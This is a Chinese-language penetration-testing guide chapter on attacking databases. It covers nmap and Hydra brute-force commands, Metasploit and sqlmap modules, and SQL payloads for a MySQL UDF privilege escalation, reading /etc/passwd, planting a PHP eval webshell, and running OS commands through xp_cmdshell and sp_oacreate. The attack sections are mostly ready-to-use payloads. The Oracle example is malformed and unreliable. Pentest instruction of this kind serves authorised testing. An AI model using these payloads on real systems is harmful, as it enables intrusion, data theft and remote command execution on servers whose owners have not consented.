# 数据库渗透测试方法

### 14.1 数据库渗透测试流程

```text
数据库渗透测试流程:

Phase 1: 信息收集
  ├── 数据库类型识别
  ├── 版本信息获取
  ├── 端口扫描
  ├── 默认账户检查
  └── 网络可达性测试

Phase 2: 认证测试
  ├── 弱密码检测
  ├── 默认账户检测
  ├── 密码策略检查
  ├── 账户锁定策略
  └── 认证协议分析

Phase 3: 授权测试
  ├── 权限提升测试
  ├── 越权访问测试
  ├── 存储过程权限
  └── 角色继承检查

Phase 4: 漏洞扫描
  ├── 已知漏洞(CVE)检测
  ├── 配置漏洞检查
  ├── 补丁状态检查
  └── 插件漏洞检测

Phase 5: 数据安全
  ├── 敏感数据发现
  ├── 数据加密检查
  ├── 备份安全检查
  └── 审计日志完整性

Phase 6: 报告
  ├── 漏洞清单
  ├── 风险评级
  ├── 修复建议
  └── 复测计划
```

### 14.2 数据库渗透测试工具

```bash
# 1. Nmap数据库脚本扫描
nmap -sV -p 3306 --script=mysql-info,mysql-empty-password,mysql-audit,mysql-databases \
    10.0.0.1

nmap -sV -p 5432 --script=pgsql-brute,pgsql-databases \
    10.0.0.1

nmap -sV -p 1433 --script=ms-sql-info,ms-sql-empty-password,ms-sql-brute \
    10.0.0.1

nmap -sV -p 1521 --script=oracle-brute,oracle-enum-users \
    10.0.0.1

nmap -sV -p 27017 --script=mongodb-info,mongodb-databases \
    10.0.0.1

nmap -sV -p 6379 --script=redis-info,redis-brute \
    10.0.0.1

nmap -sV -p 9200 --script=http-title,elasticsearch \
    10.0.0.1

# 2. Hydra暴力破解
hydra -L users.txt -P passwords.txt mysql://10.0.0.1:3306
hydra -L users.txt -P passwords.txt postgresql://10.0.0.1:5432
hydra -L users.txt -P passwords.txt mssql://10.0.0.1:1433
hydra -P passwords.txt redis://10.0.0.1:6379

# 3. Metasploit数据库模块
# MySQL
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/mysql/mysql_login
use auxiliary/scanner/mysql/mysql_schemadump
use exploit/multi/mysql/mysql_udf_payload

# PostgreSQL
use auxiliary/scanner/postgres/postgres_version
use auxiliary/scanner/postgres/postgres_login
use auxiliary/scanner/postgres/postgres_schemadump

# SQL Server
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mssql/mssql_login
use auxiliary/admin/mssql/mssql_sql
use exploit/windows/mssql/mssql_payload

# 4. sqlmap数据库指纹识别
sqlmap -u "http://target.com/page?id=1" --fingerprint --batch
sqlmap -u "http://target.com/page?id=1" --banner --batch
sqlmap -u "http://target.com/page?id=1" --current-user --batch
sqlmap -u "http://target.com/page?id=1" --current-db --batch
sqlmap -u "http://target.com/page?id=1" --is-dba --batch
sqlmap -u "http://target.com/page?id=1" --privileges --batch
```

### 14.3 数据库漏洞利用案例

```sql
-- MySQL UDF提权(需要MySQL插件目录可写)
-- 1. 检查plugin目录
SHOW VARIABLES LIKE 'plugin_dir';

-- 2. 通过sqlmap上传UDF
sqlmap -u "http://target.com/page?id=1" --os-shell
sqlmap -u "http://target.com/page?id=1" --file-write=/usr/lib/udf.so --file-dest=/usr/lib/mysql/plugin/udf.so

-- 3. 创建自定义函数
CREATE FUNCTION sys_eval RETURNS string SONAME 'udf.so';
SELECT sys_eval('whoami');

-- MySQL文件读写
-- 检查文件读写权限
SHOW VARIABLES LIKE 'secure_file_priv';

-- 读取文件
SELECT LOAD_FILE('/etc/passwd');

-- 写入WebShell
SELECT '<?php @eval($_POST[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php';
SELECT '<?php @eval($_POST[cmd]);?>' INTO DUMPFILE '/var/www/html/shell.php';

-- SQL Server命令执行
-- 使用xp_cmdshell
EXEC xp_cmdshell 'whoami';

-- 启用xp_cmdshell(需要sa权限)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 使用sp_oacreate执行命令
DECLARE @shell INT;
EXEC sp_oacreate 'wscript.shell', @shell OUT;
EXEC sp_oamethod @shell, 'run', null, 'cmd /c whoami > c:\output.txt';

-- Oracle命令执行
-- 使用DBMS_JAVA_EXEC
SELECT DBMS_JAVA_TEST.FUNCTION('java.lang.Runtime','getRuntime') FROM dual;
```
